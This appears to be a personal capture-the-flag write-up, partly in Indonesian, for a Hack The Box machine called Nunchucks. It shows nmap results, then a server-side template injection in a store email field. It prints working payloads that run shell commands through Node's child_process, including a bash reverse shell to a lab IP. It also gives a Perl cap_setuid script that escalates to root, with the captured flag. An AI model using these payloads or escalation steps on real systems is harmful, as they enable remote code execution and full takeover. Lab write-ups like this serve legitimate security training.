
| PORT | STATE | SERVICE | VERSION                                             |
|------|-------|---------|-----------------------------------------------------|
| 22/tcp | open  | ssh     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
| 80/tcp | open  | http    | nginx 1.18.0 (Ubuntu)                               |
| 443/tcp| open  | ssl/http| nginx 1.18.0 (Ubuntu)                               |

### Detail Layanan:

#### Port 22/tcp (ssh)
- **State**: Open
- **Service**: ssh
- **Version**: OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
- **SSH Hostkey**:
  - RSA: 3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21
  - ECDSA: 256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71
  - ED25519: 256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3

#### Port 80/tcp (http)
- **State**: Open
- **Service**: http
- **Version**: nginx 1.18.0 (Ubuntu)
- **HTTP Title**: Did not follow redirect to https://nunchucks.htb/
- **HTTP Server Header**: nginx/1.18.0 (Ubuntu)

#### Port 443/tcp (ssl/http)
- **State**: Open
- **Service**: ssl/http
- **Version**: nginx 1.18.0 (Ubuntu)
- **SSL Certificate**:
  - **Subject**: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
  - **Subject Alternative Name**: DNS:localhost, DNS:nunchucks.htb
  - **Validity**:
    - Not valid before: 2021-08-30T15:42:24
    - Not valid after: 2031-08-28T15:42:24
- **HTTP Title**: Nunchucks - Landing Page
- **TLS Information**:
  - TLS randomness does not represent time
  - ALPN protocols: http/1.1
  - Next protocol: http/1.1

### Informasi Tambahan:
- **Service Info**: OS: Linux; CPE: cpe:/o:linux:linux_kernel


# SubDomain 
| Path       | Status | Size | Words | Lines | Duration | 
|------------|--------|------|-------|-------|----------| 
| /store     | 200    | 4029 | 1053  | 102   | 897ms    |


# Exploit

terdapat form email, yang ada di subdomain store. saya kira pertama ini adalah kerentanan XSS tapi tidak, ternyata ssti

![[Screenshot at 2024-06-23 11-21-41.png]]


payload
```json
{
  "email": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}@gmail.com"
}
```

![[Screenshot at 2024-06-23 11-39-52.png]]


**payload RCE:**

```json
{
  "email": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('bash -c \\\"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\\\"')\")()}}@gmail.com"
}
```


# ROOT

```bash
/usr/bin/perl = cap_setuid+ep
```

```perl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/bash";
```

```bash
(remote) david@nunchucks:/tmp$ nano root.pl
(remote) david@nunchucks:/tmp$ chmod +x root.pl 
(remote) david@nunchucks:/tmp$ ./root.pl 
root@nunchucks:/tmp# id 
uid=0(root) gid=1000(david) groups=1000(david)
root@nunchucks:/tmp# cat /root/root.txt 
7941d2a194498c299760abcc403ff558
```


